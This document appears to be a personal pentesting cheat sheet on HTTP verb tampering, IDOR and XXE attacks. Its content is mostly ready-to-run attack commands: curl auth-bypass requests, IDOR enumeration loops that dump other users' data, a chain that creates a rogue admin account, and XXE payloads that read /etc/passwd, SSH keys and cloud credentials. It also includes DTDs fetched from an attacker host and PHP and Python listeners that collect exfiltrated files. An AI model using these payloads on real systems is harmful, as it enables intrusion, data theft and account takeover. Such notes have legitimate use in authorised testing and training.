# Web Attacks

#WebAttacks #IDOR #XXE #HTTPVerbTampering #WebAppAttacks


## What is this?

Three core web attack classes: HTTP Verb Tampering, IDOR, and XXE. Use alongside Burp for intercepting and manipulating requests. Pairs with [[SQL Injection]], [[File Inclusion]], [[CORS Misconfiguration]].


---

## Tools

| Tool | Purpose |
|---|---|
| `Burp Suite` | Intercept and replay requests, modify verbs, test IDOR IDs, inject XXE payloads |
| `curl` | Verb tampering (`-X`), IDOR probing, XXE payload delivery |
| `ffuf` | IDOR enumeration — fuzz numeric/UUID object references |
| `XXEinjector` | Automated XXE exploitation — `git clone https://github.com/enjoiz/XXEinjector` |

---

## HTTP Verb Tampering

Web servers and apps may handle HTTP methods inconsistently — auth/filter logic applied to `POST` may not apply to `GET`, `PUT`, `HEAD`, `PATCH`, `DELETE`, `OPTIONS`, etc.

### Auth Bypass

```bash
# Original request requires auth on POST
curl -s -X POST http://<target>/admin/delete.php -d "id=1"
# → 401 Unauthorized

# Try alternate verbs
curl -s -X GET "http://<target>/admin/delete.php?id=1"
curl -s -X HEAD http://<target>/admin/delete.php
curl -s -X PUT http://<target>/admin/delete.php
curl -s -X DELETE "http://<target>/admin/delete.php?id=1"
curl -s -X OPTIONS http://<target>/admin/delete.php -v   # check allowed methods

# X-HTTP-Method-Override header (bypass middleware/proxy restrictions)
curl -s -X POST http://<target>/admin/delete.php -H "X-HTTP-Method-Override: DELETE" -d "id=1"

curl -s -X POST http://<target>/api/user/1 -H "X-HTTP-Method: PUT" -d '{"role":"admin"}'
```

### Security Filter Bypass

WAF/code may sanitize `POST` body but ignore other verbs:

```bash
# Test SQLi via verb tamper — if POST is filtered but GET is not
curl -s -X GET "http://<target>/search.php?q=1' OR '1'='1"

# If app checks verb in code:
# if ($_SERVER['REQUEST_METHOD'] == 'POST') { sanitize($_POST['input']); }
# GET request bypasses the sanitization block entirely

# Fuzz verbs with ffuf
ffuf -w /usr/share/seclists/Fuzzing/http-request-methods.txt -u http://<target>/admin.php -X FUZZ -mc 200,302 -v
```

### Burp Suite

1. Intercept request → right-click → **Change request method**
2. Or manually edit the verb in Repeater
3. Check response codes: `200`/`302` = bypassed, `405` = method not allowed, `401`/`403` = still blocked

---

## IDOR (Insecure Direct Object References)

App exposes object references (IDs, filenames, hashes) in user-controlled input without validating ownership server-side.

### Identification

```bash
# Simple numeric ID — change to another user's
curl -s "http://<target>/profile.php?id=2"      # your account
curl -s "http://<target>/profile.php?id=1"      # try admin
curl -s "http://<target>/profile.php?id=100"    # other users

# File-based IDOR
curl -s "http://<target>/download.php?file=invoice_1001.pdf"
curl -s "http://<target>/download.php?file=invoice_1000.pdf"   # another user

# Hidden in POST body — intercept with Burp
# {"uid": 5, "action": "view_profile"}
# change uid to 1 → admin

# IDOR in API endpoints
curl -s "http://<target>/api/v1/users/5/profile"
curl -s "http://<target>/api/v1/users/1/profile"   # admin
```

### Encoded / Hashed Parameters

```bash
# Base64 encoded IDs
echo -n "5" | base64        # NQ==
echo -n "NQ==" | base64 -d  # 5
# Change to target ID, re-encode
echo -n "1" | base64        # MQ==
curl -s "http://<target>/profile.php?id=MQ=="

# MD5 hashed IDs — crack or enumerate
echo -n "1" | md5sum        # c4ca4238a0b923820dcc509a6f75849b
echo -n "2" | md5sum        # c81e728d9d4c2f636f067f89cc14862c
# Enumerate 1-20:
for i in $(seq 1 20); do
  hash=$(echo -n "$i" | md5sum | awk '{print $1}')
  echo "$i → $hash"
done

# Combined b64 + md5 (as in HTB example)
for i in $(seq 1 20); do
  hash=$(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -')
  curl -sOJ -X POST -d "contract=$hash" "http://<target>/download.php"
done
```

### Mass IDOR Enumeration

```bash
# ffuf numeric ID enum
ffuf -w <(seq 1 500 | tr '\n' '\n') -u "http://<target>/api/users/FUZZ" -mc 200 -v

# Burp Intruder: Sniper on the ID parameter, number payload 1-1000

# Script: dump all accessible objects
for i in $(seq 1 100); do
  resp=$(curl -s -b "session=<cookie>" "http://<target>/profile.php?id=$i")
  if ! echo "$resp" | grep -q "Access Denied\|Not Found\|Error"; then
    echo "[+] ID $i accessible"
    echo "$resp" >> idor_dump.txt
  fi
done

# Filter for content (skip empty/error responses)
for i in $(seq 1 100); do
  len=$(curl -so /dev/null -w "%{size_download}" -b "session=<cookie>" "http://<target>/api/invoice/$i")
  echo "$i: $len bytes"
done | grep -v ": 0 bytes\|: 45 bytes"   # filter empty/error size
```

### IDOR in APIs

```bash
# Information disclosure — read another user
curl -s -H "Authorization: Bearer <token>" "http://<target>/api/profile/2"

# Insecure function call — modify another user
curl -s -X PUT -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"role":"admin","uid":2}' "http://<target>/api/profile/2"

# IDOR on delete
curl -s -X DELETE -H "Authorization: Bearer <token>" "http://<target>/api/users/2"

# Check if role field is user-controlled (in cookies/JWT/JSON)
# Decode JWT payload:
echo "<jwt_payload>" | base64 -d 2>/dev/null | python3 -m json.tool
# If role is in JWT and not signed properly → change role and re-encode
```

### IDOR Chain: Enum → Escalate

```bash
# Step 1: GET — enumerate user data (info disclosure)
curl -s -H "Cookie: session=<cookie>" "http://<target>/api/profile/1"
# Returns: {"uid":1,"uuid":"a5f38...","username":"admin","role":"web_admin"}

# Step 2: PUT — use leaked uuid to escalate role
curl -s -X PUT -H "Cookie: session=<cookie>" -H "Content-Type: application/json" -d '{"uid":1,"uuid":"a5f38...","role":"web_admin","username":"admin"}' "http://<target>/api/profile/<your-uid>"

# Step 3: POST — use new admin role to create user or exfil data
curl -s -X POST -H "Cookie: session=<cookie>" -H "Content-Type: application/json" -d '{"username":"attacker","password":"Pwn3d!","role":"web_admin"}' "http://<target>/api/users"
```

---

## XXE (XML External Entity) Injection

XML parsers that process user-supplied XML may resolve external entities — enabling file read, SSRF, or OOB exfiltration.

### Identify XML Input

```bash
# Change Content-Type and send XML body
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><root><name>test</name></root>'

# Also test JSON endpoints — some accept both
# Check: Content-Type: application/json → application/xml
# Or intercept a form and manually change body format
```

### Local File Disclosure

```bash
# /etc/passwd read — inject into a displayed field
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>'

# Windows targets
# file:///c:/windows/win.ini
# file:///c:/inetpub/wwwroot/web.config

# PHP source via php://filter
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><name>&xxe;</name></root>'
# Decode response: echo "<b64>" | base64 -d

# Read /etc/hosts, /etc/shadow, SSH keys, app config files
# file:///home/<user>/.ssh/id_rsa
# file:///var/www/html/config.php
# file:///proc/net/fib_trie  (internal IPs)
```

### CDATA Wrap (Bypass XML Special Chars)

When file content contains `<`, `>`, or `&` that break XML parsing:

```bash
# Host xxe.dtd on attacker HTTP server:
# Content of xxe.dtd:
cat > xxe.dtd << 'EOF'
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/config.php">
<!ENTITY % end "]]>">
<!ENTITY % xxe "<!ENTITY joined '%begin;%file;%end;'>">
EOF

# Start server: python3 -m http.server 8000

# Send to target:
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
  %remote;
  %xxe;
]>
<root><name>&joined;</name></root>'
```

### Error-Based XXE

When output is not reflected but errors are shown:

```bash
# xxe.dtd for error-based:
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY &#x25; oob SYSTEM 'file:///NONEXISTENT/%file;'>">
EOF

# Request:
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
  %remote;
  %error;
  %oob;
]>
<root><name>test</name></root>'
# File contents appear in error message: "file not found: /NONEXISTENT/<passwd contents>"
```

### Blind OOB Exfiltration

When nothing is reflected and no errors shown:

```bash
# xxe.dtd — base64 encode file and exfil via HTTP GET:
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<attacker-ip>:8000/?data=%file;'>">
EOF

# Simple PHP listener to catch data:
cat > index.php << 'EOF'
<?php
if(isset($_GET['data'])){
    $decoded = base64_decode($_GET['data']);
    file_put_contents('stolen.txt', $decoded . "\n", FILE_APPEND);
    error_log($decoded);
}
?>
EOF
php -S 0.0.0.0:8000

# Request:
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root><name>&content;</name></root>'

# Python alternative listener (no PHP needed):
python3 -c "
import http.server, base64, urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'data' in q:
            print(base64.b64decode(q['data'][0]).decode())
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(('0.0.0.0', 8000), H).serve_forever()
"
```

### SSRF via XXE

```bash
# Internal port scan via XXE SSRF
for port in 22 80 443 3306 8080 8443; do
  curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?>
<!DOCTYPE root [
  <!ENTITY ssrf SYSTEM \"http://127.0.0.1:$port/\">
]>
<root><name>&ssrf;</name></root>" | grep -v "Connection refused\|failed" && echo "Port $port open"
done

# Cloud metadata via XXE
curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><name>&meta;</name></root>'
```

### XXEinjector (Automation)

```bash
# Clone and use XXEinjector
git clone https://github.com/enjoiz/XXEinjector
cd XXEinjector

# Save request to file (from Burp) with XXEINJECT placeholder in XML body:
# POST /submit HTTP/1.1
# Host: <target>
# Content-Type: application/xml
#
# <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "XXEINJECT">]><root>&xxe;</root>

# File enumeration
ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --path=/etc/passwd --oob=http --phpfilter

# Directory listing
ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --path=/etc/ --oob=http --enumerate

# Brute force file paths
ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --brute=/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

---

## Attack Matrix

| Technique | What to Look For | Impact |
|-----------|-----------------|--------|
| Verb Tampering | Auth on POST only, filters on one verb | Auth bypass, filter bypass |
| IDOR numeric | `?id=`, `?uid=`, URL path `/users/5` | Data disclosure, account takeover |
| IDOR hashed | b64/md5 params in URL or body | Same — enumerate decoded values |
| IDOR API | REST endpoints with resource IDs | Privesc via role field manipulation |
| XXE reflected | XML input with visible output field | File read, SSRF |
| XXE blind | XML input, no output | OOB exfil via DNS/HTTP |
| XXE error | XML input, errors shown | File read in error message |

---

## Quick Reference

```bash
# Verb tamper — try all methods
for verb in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  echo -n "$verb: "
  curl -s -o /dev/null -w "%{http_code}" -X $verb "http://<target>/admin.php"
  echo
done

# IDOR — numeric enum
for i in $(seq 1 50); do
  code=$(curl -so /dev/null -w "%{http_code}" -b "session=<c>" "http://<target>/api/user/$i")
  [ "$code" = "200" ] && echo "[+] $i"
done

# XXE — quick file read test
curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'

# XXE — SSRF to metadata
curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>'
```

---

*Created: 2026-03-04*
*Updated: 2026-05-13*
*Model: claude-sonnet-4-6*